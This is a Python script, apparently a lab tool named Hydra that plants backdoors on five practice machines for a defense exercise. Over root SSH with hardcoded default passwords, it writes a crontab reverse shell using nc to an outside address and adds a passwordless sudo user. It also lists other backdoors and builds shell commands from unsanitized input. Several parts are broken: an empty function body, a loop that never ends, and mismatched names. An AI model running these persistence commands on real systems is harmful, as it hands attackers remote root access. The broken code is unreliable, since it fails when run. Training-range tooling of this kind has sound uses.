#!/usr/bin/env python3
import file
import paramiko
import os
import sys
import random

def main():
    os.system("rm -rf /tmp/github")
    print("Checking for updates...")
    if(updatePend()):
        option = input ("An update is available. Would you like to update? ")
        if(option.lower() == "y" or option.lower() == "yes"):
            os.system("python3 /lib/Hydra/updater.py &")
            return
    else:
        print("Hydra is up to date.")
    z = False
    if (not isFirstTime()):
        z = True
    if(isFirstTime()):
        print("Running first time setup...")
        if(netSetup(True)):
            return
        else:
            z = True
    if(z):
        network = getNetInfo()
        legend = getLegend()
        del(legend[0]) #Removes weird empty entry at beginning of legend
        presetList = []
        for preset in legend:
            presetList.append(preset[0])
        if(legend == "invalid"):
            a = False   #No saved legend
        else:
            a = True
        print("Current presets: ")
        for preset in legend:
            if(preset[1] == "easy"):
                print(f"{preset[0]} - Difficulty: \033[32;1m[EASY]\033[0m")
            if(preset[1] == "medium"):
                print(f"{preset[0]} - Difficulty: \033[33;1m[MEDIUM]\033[0m")
            if(preset[1] == "hard"):
                print(f"{preset[0]} - Difficulty: \033[31;1m[HARD]\033[0m")
        x = True
        while(x):
            command = input("Enter command: ")
            if(command.lower() == "view"):
                preset = input("Which preset would you like to view? ")
                if(preset not in presetList):
                    print("Entered preset not in list.")
                else:
                    selectedPreset = preset
                    for preset in legend:
                        if(preset[0] == selectedPreset):
                            selectedDiff = preset[1]
                            selectedRules = preset[2]
                    print(f"Preset: {selectedPreset}")
                    print(f"Difficulty: {selectedDiff}")
                    print("")
                    for machine in selectedRules:
                        vulnDesc = []
                        for vuln in machine[1]:
                            vulnDesc.append(transNumToWeakness(vuln))
                        description = ', '.join(vulnDesc)
                        print(f"{machine[0]} selections: {description}")
            elif(command.lower() == "launch"):
                print("Current presets: ")
                for preset in presetList:
                    if(preset[1] == "easy"):
                        print(f"{preset[0]} - Difficulty: \033[32;1m[EASY]\033[0m")
                    if(preset[1] == "medium"):
                        print(f"{preset[0]} - Difficulty: \033[33;1m[MEDIUM]\033[0m")
                    if(preset[1] == "hard"):
                        print(f"{preset[0]} - Difficulty: \033[31;1m[HARD]\033[0m")
                option = input("Which preset would you like to load(r for random)? ")
                if(option.lower() == "r"):
                    randomload()
                elif(option not in presetList):
                    print("Entered preset not in list.")
                else:
                    for preset in legend:
                        if(preset[0] == selectedPreset):
                            selectedRules = preset[2]
                    load(selectedRules)
            elif(command.lower() == "config"):
                netSetup(False)
            elif(command.lower() == "exit"):
                x = False
            
def load(presetVulns):
    
def randomLoad():
    ammountList = []    #Order: Ecomm, Fedora, Splunk, Ubuntu, Debian
    ammountList.append(random.randint(3,7))
    ammountList.append(random.randint(2,6))
    ammountList.append(random.randint(2,5))
    ammountList.append(random.randint(2,5))
    ammountList.append(random.randint(2,5))
    
    vulnList = [["ecomm"],["fedora"],["splunk"],["ubuntu"],["debian"]]
    
    y = 0
    while(y < 5):
        z = 0
        x = ammountList[y]
        tmpVulnList = []
        while(z < x):
            vulnNum = random.randint(1,7)
            tmpVulnList.append(vulnNum)
        y = y + 1
        vulnList[y].append(tmpVulnList)
    load(vulnList)
def isFirstTime():
    conf = open("/lib/Hydra/network.conf", "r")
    cont = conf.read()
    if(len(cont.split("\n")) < 2):
        return True
    return False
def getNetInfo():
    network = [[]]
    conf = open("/lib/Hydra/network.conf", "r")
    cont = conf.read()
    contLined = cont.split("\n")
    del(contLined[len(contLined)-1])
    for line in contLined:
        lineSplit = line.split(":")
        machine = lineSplit[0]
        address = lineSplit[1]
        os = lineSplit[2]
        machineList = []
        machineList.append(machine)
        machineList.append(address)
        machineList.append(os)
        network.append(machineList)
    return network
def getDefaultDependencies(network):
    defaultDependencies = ["ncat", "python3", "git"]
    for machine in network:
        password = getDefPassword(machine[0])
        address = machine[1]
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(address, username="root", password=password)
        
        if(getPacMan(machine[0]) == "yum"):
            for item in defaultDependencies:
                command = f"yum install -y {item}"
                stdin, stdout, stderr = ssh_client.exec_command(f"echo {password} | sudo -S {command}")
        elif(getPacMan(machine[0]) == "apt"):
            for item in defaultDependencies:
                command = f"apt-get install -y {item}"
                stdin, stdout, stderr = ssh_client.exec_command(f"echo {password} | sudo -S {command}")
def getLegend():
    returnList = [[[]]]
    f = open("/lib/Hydra/legend.list", "r")
    legendStr = f.read()
    legendList = legendStr.split(".\n")
    x = len(legendList)
    if(x <= 0):
        return "invalid"
    for preset in legendList:
        presetArray = [[]]
        presetSplit = preset.split(":\n")
        presetTitle = presetSplit[0].split(",")
        
        presetNum = presetTitle[0]
        presetDiff = presetTitle[1]
        
        presetList = presetSplit[1]
        
        presetListSplit = presetList.split("\n")
        
        for machine in presetListSplit:
            machineVulns = []
            infoList = machine.split(";")
            if(len(infoList) == 1):
                pass
            else:
                machineName = infoList[0]
                machineVulns = infoList[1].split(",")
                presetArray.append([machineName, machineVulns])
        del(presetArray[0])
        returnList.append([presetNum, presetDiff, presetArray])
    return returnList
def netSetup(flag):
    ecommAddr = input("Enter Ecom IP: ")
    ecommOS = input("Enter Ecom OS(plus version): ")
    fedoraAddr = input("Enter Fedora IP: ")
    fedoraOS = input("Enter Fedora OS(plus version): ")
    splunkAddr = input("Enter Splunk IP: ")
    splunkOS = input("Enter Splunk OS(plus version): ")
    ubuntuAddr = input("Enter Ubuntu IP: ")
    ubuntuOS = input("Enter Ubuntu OS(plus version): ")
    debianAddr = input("Enter Debian IP: ")
    debianOS = input("Enter Debian OS(plus version): ")
        
    os.system(f'echo "ecomm:{ecommAddr}:{ecommOS}" >> /lib/Hydra/network.conf')
    os.system(f'echo "fedora:{fedoraAddr}:{fedoraOS}" >> /lib/Hydra/network.conf')
    os.system(f'echo "splunk:{splunkAddr}:{splunkOS}" >> /lib/Hydra/network.conf')
    os.system(f'echo "ubuntu:{ubuntuAddr}:{ubuntuOS}" >> /lib/Hydra/network.conf')
    os.system(f'echo "debian:{debianAddr}:{debianOS}" >> /lib/Hydra/network.conf')
    
    if(flag):
        option = input("Would you like to start Hydra? ")
        if(option.lower() == "y" or option.lower() == "yes"):
            return False
        else:
            return True
    else:
        return
def loadWeakness(machine, weakness, ssh_client):
    address = machine[1]
    
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(address, username="root", password=getDefPassword(machine[0]))
    
    if(weakness == "1"):
        command = 'echo "* * * * * root /usr/bin/nc 10.10.10.10:6969 -e /bin/bash" >> /etc/crontab'
        stdin, stdout, stderr = ssh_client.exec_command(f"{command}")
    if(weakness == "2"):
        user = input("Enter name of user to add: ")
        userPass = input(f"Enter password you would like to set for {user}: ")
        command = f'useradd {user}; echo "{user}:{userPass}" | chpasswd; echo "{user} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
        stdin, stdout, stderr = ssh_client.exec_command(f"{command}")
def updatePend():
    os.system("git clone https://github.com/ravesec/horror /tmp/github > /dev/null 2>&1")
    fOne = open("/lib/Hydra/version", "r")
    currentVers = fOne.read()
    fTwo = open("/tmp/github/Hydra/version", "r")
    gitVers = fTwo.read()
    if(currentVers == gitVers):
        return False
    else:
        return True
def printHelp():
    print("""
Hydra help menu

Commands:
    
    launch     |     Enters menu where the user can either designate a preset to use or allow random setup.
    view       |     Allows user to view a specific preset
""")
def getDefPassword(hostName):
    return {
        "ecomm": "changeme",
        "fedora": "!Password123",
        "splunk": "changemenow",
        "ubuntu": "changeme",
        "debian": "changeme",
    }.get(hostName, "")
def transNumToWeakness(num):
    return {
        "1": "Reverse Shell in /etc/crontab",
        "2": "Pre-Set admin user",
        "3": "Pre-Planted Root SSH Key",
        "4": "Venom Backdoor Install",
        "5": "Compromised /bin/passwd",
        "6": "Compromised /bin/sudo",
        "7": "Pre-Planted SkyKit",
    }.get(num, "")
def getPacMan(machine):
    return {
        "ecomm": "yum",
        "fedora": "yum",
        "splunk": "yum",
        "ubuntu": "apt",
        "debian": "apt",
    }.get(machine, "")
main()